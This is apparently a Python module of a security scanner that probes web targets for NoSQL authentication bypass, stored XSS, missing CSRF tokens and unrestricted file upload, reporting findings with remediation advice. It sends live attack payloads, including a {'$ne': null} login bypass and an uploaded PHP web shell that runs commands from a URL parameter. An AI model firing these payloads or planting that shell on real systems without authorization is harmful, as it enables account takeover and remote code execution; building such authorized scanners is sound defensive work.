"""Scanner for vulnerabilities requiring specific endpoints (not param-based):
NoSQL injection (auth bypass), Stored XSS (write→read), CSRF, Unrestricted File Upload.
"""
from __future__ import annotations

import json

from ...core.http import HttpClient
from ...core.logging import AuditLogger
from ...core.models import Evidence, Finding, Severity, Target
from ...core.scope import ActionClass, ScopeGuard


class AdvancedScanner:
    name = "advanced-scanner (native)"

    def __init__(self, http: HttpClient, log: AuditLogger, guard: ScopeGuard):
        self.http = http
        self.log = log
        self.guard = guard

    def scan(self, target: Target, *, nosql_login: list[str] | None = None,
             stored_xss: list[tuple[str, str, str]] | None = None,
             csrf_forms: list[tuple[str, str]] | None = None,
             upload_paths: list[str] | None = None) -> list[Finding]:
        base = target.url.rstrip("/")
        self.guard.authorize(base, ActionClass.ACTIVE)
        findings: list[Finding] = []
        for ep in (nosql_login or []):
            findings += self._nosqli(base, ep)
        for w, r, field in (stored_xss or []):
            findings += self._stored_xss(base, w, r, field)
        for form, submit in (csrf_forms or []):
            findings += self._csrf(base, form, submit)
        for up in (upload_paths or []):
            findings += self._file_upload(base, up)
        return findings

    def _report(self, out: list[Finding], f: Finding) -> None:
        self.log.finding(f.title, f.severity.value, owasp=f.owasp)
        out.append(f)

    def _nosqli(self, base: str, endpoint: str) -> list[Finding]:
        out: list[Finding] = []
        hdr = {"Content-Type": "application/json"}
        inj = self.http.post(f"{base}{endpoint}", headers=hdr,
                             content=json.dumps({"username": "admin", "password": {"$ne": None}}))
        wrong = self.http.post(f"{base}{endpoint}", headers=hdr,
                              content=json.dumps({"username": "admin", "password": "wrong_bz_xyz"}))
        inj_ok = '"success": true' in inj.text.lower().replace(" ", " ") or '"success":true' in inj.text.lower() or "token" in inj.text.lower()
        wrong_ok = '"success":true' in wrong.text.lower().replace(" ", "") or "token" in wrong.text.lower()
        if inj_ok and not wrong_ok:
            self.log.action(base, self.name, f"NoSQLi probe {endpoint}")
            self._report(out, Finding(
                title=f"NoSQL Injection (auth bypass) in {endpoint}",
                severity=Severity.CRITICAL, owasp="A05:2025 Injection", cwe="CWE-943",
                target=f"{base}{endpoint}", component=endpoint, source_tool=self.name,
                description="A NoSQL operator ({\"$ne\": null}) in the password field bypasses authentication.",
                impact="Logging in without knowing the password; access to any account.",
                recommendation="Validate types (password must be a string); do not pass objects into queries.",
                evidence=Evidence(payload='{"username":"admin","password":{"$ne":null}}',
                                  response=inj.text[:200])))
        return out

    def _stored_xss(self, base: str, write: str, read: str, field: str) -> list[Finding]:
        out: list[Finding] = []
        marker = "bzSTORED9"
        payload = f"<script>{marker}()</script>"
        # try JSON, then form-encoded
        self.http.post(f"{base}{write}", headers={"Content-Type": "application/json"},
                      content=json.dumps({field: payload}))
        self.http.post(f"{base}{write}", headers={"Content-Type": "application/x-www-form-urlencoded"},
                      content=f"{field}={payload}")
        r = self.http.get(f"{base}{read}")
        if payload in r.text:
            self.log.action(base, self.name, f"Stored XSS {write}->{read}")
            self._report(out, Finding(
                title=f"Stored XSS in {read} (field '{field}')",
                severity=Severity.HIGH, owasp="A05:2025 Injection", cwe="CWE-79",
                target=f"{base}{read}", component=f"{write}->{read}", source_tool=self.name,
                description="A payload saved through the form is rendered to other users without encoding.",
                impact="Persistent XSS — JS execution for every visitor (session theft, XSS worm).",
                recommendation="Encode the output when rendering; sanitize input; CSP.",
                reproduction=(f"1. POST {base}{write} with {field}={payload}\n"
                              f"2. Open {base}{read} — the script will execute. Visible PoC: use "
                              f"<script>alert(document.domain)</script>."),
                evidence=Evidence(payload=payload, request=f"POST {write} -> GET {read}",
                                  response=r.text[:200])))
        return out

    def _csrf(self, base: str, form: str, submit: str) -> list[Finding]:
        out: list[Finding] = []
        import re
        r = self.http.get(f"{base}{form}")
        has_token = bool(re.search(r'name=["\']?(csrf|_token|authenticity_token|xsrf)',
                                   r.text, re.IGNORECASE))
        setcookie = r.header("Set-Cookie") or ""
        samesite = "samesite" in setcookie.lower()
        if not has_token and re.search(r"<form[^>]*method=['\"]?post", r.text, re.IGNORECASE):
            self.log.action(base, self.name, f"CSRF probe {form}")
            self._report(out, Finding(
                title=f"Missing CSRF protection in form {form} (action {submit})",
                severity=Severity.MEDIUM, owasp="A01:2025 Broken Access Control", cwe="CWE-352",
                target=f"{base}{submit}", component=form, source_tool=self.name,
                description="A state-changing form does not contain an anti-CSRF token"
                            + ("" if samesite else "; session cookie without the SameSite attribute") + ".",
                impact="An attacker can force an action (e.g. changing the email) on behalf of a logged-in victim.",
                recommendation="Deploy an anti-CSRF token (synchronizer/double-submit) and a SameSite=Lax/Strict cookie.",
                evidence=Evidence(response=f"token in form: {has_token}; SameSite: {samesite}")))
        return out

    def _file_upload(self, base: str, endpoint: str) -> list[Finding]:
        out: list[Finding] = []
        files = {"file": ("shell.php", b"<?php system($_GET['c']); ?>", "application/x-php")}
        r = self.http.post(f"{base}{endpoint}", files=files)
        low = r.text.lower()
        rejected = any(w in low for w in ("not allowed", "invalid", "rejected", "forbidden", "denied"))
        accepted = r.status in (200, 201) and ("saved" in low or "shell.php" in low or "filename" in low)
        if accepted and not rejected:
            self.log.action(base, self.name, f"file-upload {endpoint}")
            self._report(out, Finding(
                title=f"Unrestricted File Upload in {endpoint}",
                severity=Severity.CRITICAL, owasp="A05:2025 Injection", cwe="CWE-434",
                target=f"{base}{endpoint}", component=endpoint, source_tool=self.name,
                description="The server accepted a .php file with code — no extension/type validation.",
                impact="Uploading a webshell → remote code execution (RCE).",
                recommendation="Allowlist extensions/MIME; store outside the webroot; random names; AV scan.",
                evidence=Evidence(payload="shell.php: <?php system($_GET['c']); ?>",
                                  response=r.text[:200])))
        return out
